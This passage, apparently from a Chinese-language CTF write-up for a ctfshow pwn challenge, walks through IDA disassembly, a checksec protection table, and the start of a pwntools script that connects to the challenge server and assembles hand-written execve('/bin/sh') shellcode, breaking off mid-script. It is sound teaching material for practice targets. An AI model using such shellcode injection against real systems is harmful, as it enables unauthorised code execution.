+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ctfshow&lt;/span&gt;         &lt;span class=&#34;nv&#34;&gt;proc&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;near&lt;/span&gt;               &lt;span class=&#34;c1&#34;&gt;; CODE XREF: main+132↓p&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;             &lt;span class=&#34;err&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;byte&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;88h&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;var_4&lt;/span&gt;           &lt;span class=&#34;err&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;dword&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ptr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; __unwind {&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C6&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C7&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C9&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;CA&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;sub&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;84h&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;D0&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;__x86_get_pc_thunk_bx&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;D5&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;_GLOBAL_OFFSET_TABLE_&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;DB&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;sub&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;DE&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;mh&#34;&gt;100h&lt;/span&gt;            &lt;span class=&#34;c1&#34;&gt;; nbytes&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;E3&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;lea&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;E9&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;; buf&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;EA&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;               &lt;span class=&#34;c1&#34;&gt;; fd&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;EC&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;_read&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F1&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;10h&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F4&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;sub&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0Ch&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F7&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;lea&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;FD&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;push&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;             &lt;span class=&#34;c1&#34;&gt;; s&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;080484&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;FE&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;_puts&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048503&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;esp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;10h&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048506&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;lea&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;0804850&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;call&lt;/span&gt;    &lt;span class=&#34;nb&#34;&gt;eax&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;0804850&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;E&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;nop&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;0804850&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;F&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;mov&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;ebx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ebp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;var_4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048512&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;leave&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt;                 &lt;span class=&#34;nf&#34;&gt;retn&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; } // starts at 80484C6&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;ctfshow&lt;/span&gt;         &lt;span class=&#34;nv&#34;&gt;endp&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048513&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048514&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;08048514&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; =============== S U B R O U T I N E =======================================&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这代码是在看不懂可以上AI嗦一下，让它帮你解析一下，毕竟刚入门&amp;hellip;&amp;hellip;（这段代码是 IDA 反编译出的 32 位 x86 架构程序中&lt;code&gt;ctfshow&lt;/code&gt;函数）&lt;/p&gt;
+&lt;p&gt;checksec一下：记住上面的参数，后面写exp要用&amp;hellip;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/62.png&#34;
+	width=&#34;675&#34;
+	height=&#34;180&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/62_hu_384015e3cc48e.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/62_hu_8910832fcad885ea.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;375&#34;
+		data-flex-basis=&#34;900px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可知，对这些保护有点遗忘的可以回去看&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-1/#linux%e5%ae%89%e5%85%a8%e9%98%b2%e6%8a%a4%e6%9c%ba%e5%88%b6&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PWN-1的Linux安全保护机制&lt;/a&gt;&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;保护项&lt;/th&gt;
+          &lt;th&gt;状态&lt;/th&gt;
+          &lt;th&gt;对利用的影响&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Arch&lt;/td&gt;
+          &lt;td&gt;i386-32-Little&lt;/td&gt;
+          &lt;td&gt;32 位 x86 架构，shellcode 需用 32 位版本（对应&lt;code&gt;shellcraft.i386.sh()&lt;/code&gt;）&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;Canary（栈溢出保护）&lt;/td&gt;
+          &lt;td&gt;No canary found&lt;/td&gt;
+          &lt;td&gt;无栈溢出保护，缓冲区溢出后可直接覆盖栈上数据（无需绕过 canary）&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;NX（栈不可执行）&lt;/td&gt;
+          &lt;td&gt;NX disabled&lt;/td&gt;
+          &lt;td&gt;栈段可执行，shellcode 直接放在栈上就能运行（无需 ROP 绕过 NX）&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;PIE（地址随机化）&lt;/td&gt;
+          &lt;td&gt;No PIE (0x8048000)&lt;/td&gt;
+          &lt;td&gt;程序地址固定，&lt;code&gt;ctfshow&lt;/code&gt;函数、&lt;code&gt;buf&lt;/code&gt;缓冲区地址不会变（无需泄露地址）&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;RWX segments&lt;/td&gt;
+          &lt;td&gt;Has RWX segments&lt;/td&gt;
+          &lt;td&gt;存在 “可读可写可执行” 的内存段，进一步确保 shellcode 能正常执行&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;总结&lt;/strong&gt;：程序保护机制极弱，直接用 “栈溢出注入 shellcode” 即可，无需复杂绕过。&lt;/p&gt;
+&lt;p&gt;回到本题目，在nc连接之后交互一会发现并无实际效果，PWN大致思路是找到后门函数或者系统调用函数进行&lt;code&gt;提权&lt;/code&gt;，提权之后就进行交互去执行一些靶机的终端命令例如：cat ctfshow_flag、ls之类的。那在此之前都得先找到这“后门”，也就是/bin/sh、zsh、system函数等等，但我发现这个程序并无这些地址存在，所以说这个程序从被制造出来都没想过要执行这些有关提权的代码&amp;hellip;..&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/66.png&#34;
+	width=&#34;1650&#34;
+	height=&#34;625&#34;
+	srcset=&#34;https://expl0rer.top/p/ctfshow-pwn-writeup/66_hu_da2faac4b22ea10b.png 480w, https://expl0rer.top/p/ctfshow-pwn-writeup/66_hu_a3ee0bccff8fa056.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;全篇搜索/bin/sh字符串&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;264&#34;
+		data-flex-basis=&#34;633px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;因为NX、canary没开、又有RWX，注入一段我们设计的有关执行/bin/sh的exp还是可以的，大致思路有了，接下来开始执行吧。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;围绕 “直接执行 shellcode” 设计方案&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;可以用pwntools的脚本啊，单纯直接调用函数的，而且pwntools有局限啊，就那用这个pwntools的shellcraft模块生成的shellcode比较晦涩难懂，而且注释放到Kali上比较杂乱，而且没有涉及到汇编语言调用，比较简单我就不用了，我这里手敲shellcode方便大家了解一下底层逻辑：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 导入 pwntools 库&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 设置日志级别为调试模式&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;) # 本地连接&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pwn.challenge.ctf.show&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28176&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 远程连接&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov eax, 0xb      
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov ecx, 0       
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov edx, 0       
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;push 0x0068732f  
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;push 0x6e69622f   
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;mov ebx, esp    
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;int 0x80         
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 生成一个 Shellcode&lt;/span&gt;
